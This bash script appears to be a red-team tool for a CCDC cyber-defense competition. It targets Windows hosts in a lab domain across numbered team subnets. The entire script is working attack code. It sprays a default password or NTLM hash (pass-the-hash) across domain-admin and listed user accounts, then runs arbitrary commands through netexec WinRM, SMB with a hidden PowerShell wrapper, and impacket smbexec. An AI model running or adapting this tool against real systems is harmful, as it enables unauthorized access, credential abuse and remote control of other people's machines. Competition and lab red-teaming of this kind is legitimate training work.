#!/bin/bash
# ================================================
# CCDC Remote Exec Script
# Usage: ./exec.sh <team> [host] [-c "command"] [-p pass_or_hash]
#
#   host  → hostname (curiosity), number (1-7), or omit to list
#   -c    → command to run (default: whoami /all)
#   -p    → password or NTLM hash (default: Th3cake1salie!)
#
#   Tries DA accounts first, then falls back to all users in users.txt
#   Tries WinRM first, then SMB, then smbexec
# ================================================

usage() {
  echo "Usage: $0 <team> [host] [-c \"command\"] [-p password_or_hash]"
  echo ""
  echo "  host can be:"
  echo "    hostname  — curiosity, morality, intelligence, anger, fact, space, adventure"
  echo "    number    — 1=curiosity 2=morality 3=intelligence 4=anger 5=fact 6=space 7=adventure"
  echo ""
  echo "Examples:"
  echo "  $0 5                               # list all boxes"
  echo "  $0 5 1                             # whoami on curiosity (DC)"
  echo "  $0 5 anger -c \"ipconfig\""
  echo "  $0 5 3 -c \"net user\" -p Th3cake1salie!"
  echo "  $0 5 curiosity -p aad3b435b51404eeaad3b435b51404ee:0aa78d8d13abad46a59ef0a63f6ae924"
  exit 1
}

# ====================== PARSE ARGS ======================
if [[ $# -lt 1 ]]; then usage; fi

TEAM="$1"; shift
if [[ -z "$TEAM" || ! "$TEAM" =~ ^[0-9]+$ ]]; then usage; fi

DOMAIN="aperturesciencelabs.org"
PASS="Th3cake1salie!"
CMD="whoami /all"
TARGET_ARG=""

# Grab optional positional host arg (before any flags)
if [[ $# -gt 0 && "$1" != -* ]]; then
  TARGET_ARG="$1"; shift
fi

while getopts "p:c:" opt; do
  case "$opt" in
    p) PASS="$OPTARG" ;;
    c) CMD="$OPTARG" ;;
    *) usage ;;
  esac
done

# ====================== HOST MAPPING ======================
# Number → hostname
declare -A NUM_HOST=(
  [1]="curiosity"
  [2]="morality"
  [3]="intelligence"
  [4]="anger"
  [5]="fact"
  [6]="space"
  [7]="adventure"
)

# Hostname → last octet
declare -A HOST_OCTET=(
  ["curiosity"]=140
  ["morality"]=10
  ["intelligence"]=11
  ["anger"]=70
  ["fact"]=71
  ["space"]=141
  ["adventure"]=72
)

HOST_ORDER=(curiosity morality intelligence anger fact space adventure)
HOST_DESC=(
  "1) curiosity     (.140) — DC"
  "2) morality      (.10)"
  "3) intelligence  (.11)"
  "4) anger         (.70)"
  "5) fact          (.71)"
  "6) space         (.141)"
  "7) adventure     (.72)"
)

# ====================== RESOLVE TARGET ======================
if [[ -z "$TARGET_ARG" ]]; then
  echo "[+] Team ${TEAM} — Available hosts:"
  for desc in "${HOST_DESC[@]}"; do
    local_host="${HOST_ORDER[$((${desc:0:1}-1))]}"
    ip="192.168.20${TEAM}.${HOST_OCTET[$local_host]}"
    printf "    %s  [%s]\n" "$desc" "$ip"
  done
  echo ""
  echo "Re-run with a host number (1-7) or hostname to execute."
  exit 0
fi

# Resolve number → hostname
if [[ "$TARGET_ARG" =~ ^[1-7]$ ]]; then
  HOSTNAME="${NUM_HOST[$TARGET_ARG]}"
elif [[ -n "${HOST_OCTET[$TARGET_ARG]}" ]]; then
  HOSTNAME="$TARGET_ARG"
else
  echo "[-] Unknown host: '$TARGET_ARG'"
  echo "    Use a number 1-7 or one of: ${HOST_ORDER[*]}"
  exit 1
fi

LAST_OCTET="${HOST_OCTET[$HOSTNAME]}"
IP="192.168.20${TEAM}.${LAST_OCTET}"
FQDN="${HOSTNAME}.${DOMAIN}"

# ====================== AUTH FLAGS ======================
# Accepts: plain password, NT hash (32 hex), or LM:NT pair
if [[ "$PASS" =~ ^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$ ]]; then
  AUTH_FLAG="-H"
  echo "[+] Auth: LM:NT hash"
elif [[ "$PASS" =~ ^[0-9a-fA-F]{32}$ ]]; then
  AUTH_FLAG="-H"
  echo "[+] Auth: NT hash"
else
  AUTH_FLAG="-p"
  echo "[+] Auth: password"
fi

# ====================== BUILD USER LIST ======================
# DA accounts take priority, then anything else in users.txt
DA_USERS=(Administrator caroline cave chell glados wheatley)

USERS_FILE="users.txt"
ALL_USERS=()

# Add DAs first
for u in "${DA_USERS[@]}"; do
  ALL_USERS+=("$u")
done

# Append users.txt entries not already in the list
if [[ -f "$USERS_FILE" ]]; then
  while IFS= read -r u || [[ -n "$u" ]]; do
    [[ -z "$u" ]] && continue
    already=0
    for da in "${DA_USERS[@]}"; do
      [[ "${u,,}" == "${da,,}" ]] && { already=1; break; }
    done
    [[ $already -eq 0 ]] && ALL_USERS+=("$u")
  done < "$USERS_FILE"
else
  echo "[!] users.txt not found — using DA list only"
fi

echo "[+] Target : ${FQDN} (${IP})"
echo "[+] Command: ${CMD}"
echo "[+] Users  : ${#ALL_USERS[@]} total (${#DA_USERS[@]} DA + $((${#ALL_USERS[@]}-${#DA_USERS[@]})) from users.txt)"
echo ""

# ====================== EXEC FUNCTIONS ======================
# Each returns 0 on success, 1 on failure

try_winrm() {
  local user="$1"
  local out
  out=$(netexec winrm "$IP" \
    -u "$user" -d "$DOMAIN" "$AUTH_FLAG" "$PASS" \
    -x "$CMD" 2>&1)
  if echo "$out" | grep -q '\[+\]'; then
    echo "[+] WinRM SUCCESS → $user"
    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
    return 0
  fi
  return 1
}

try_smb_x() {
  local user="$1"
  local out
  # netexec smb -x runs cmd.exe commands
  out=$(netexec smb "$IP" \
    -u "$user" -d "$DOMAIN" "$AUTH_FLAG" "$PASS" \
    -x "powershell.exe -NoP -NonI -c \"${CMD}\"" 2>&1)
  if echo "$out" | grep -q '\[+\]'; then
    echo "[+] SMB(cmd) SUCCESS → $user"
    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
    return 0
  fi
  return 1
}

try_smbexec() {
  local user="$1"
  local smbexec_bin
  smbexec_bin=$(command -v smbexec.py 2>/dev/null || command -v impacket-smbexec 2>/dev/null || echo "")
  [[ -z "$smbexec_bin" ]] && return 1

  local out
  if [[ "$AUTH_FLAG" == "-H" ]]; then
    out=$("$smbexec_bin" "${DOMAIN}/${user}@${FQDN}" \
      -hashes "${PASS}" -dc-ip "$IP" -target-ip "$IP" \
      -c "$CMD" 2>&1)
  else
    out=$("$smbexec_bin" "${DOMAIN}/${user}:${PASS}@${FQDN}" \
      -dc-ip "$IP" -target-ip "$IP" \
      -c "$CMD" 2>&1)
  fi
  if echo "$out" | grep -qiv 'error\|failed\|refused\|denied'; then
    echo "[+] smbexec SUCCESS → $user"
    echo "$out"
    return 0
  fi
  return 1
}

# ====================== MAIN LOOP ======================
SUCCESS=0

for USER in "${ALL_USERS[@]}"; do
  printf "[*] %-20s " "$USER"

  # 1. Try WinRM
  if try_winrm "$USER"; then
    SUCCESS=1; break
  fi

  # 2. Try SMB -x (cmd execution)
  if try_smb_x "$USER"; then
    SUCCESS=1; break
  fi

  # 3. Try smbexec (impacket)
  if try_smbexec "$USER"; then
    SUCCESS=1; break
  fi

  echo "→ no access"
done

echo ""
if [[ $SUCCESS -eq 0 ]]; then
  echo "[-] No credentials worked on ${FQDN} (${IP})"
  echo "    Check: VPN up? Host reachable? (ping ${IP})"
fi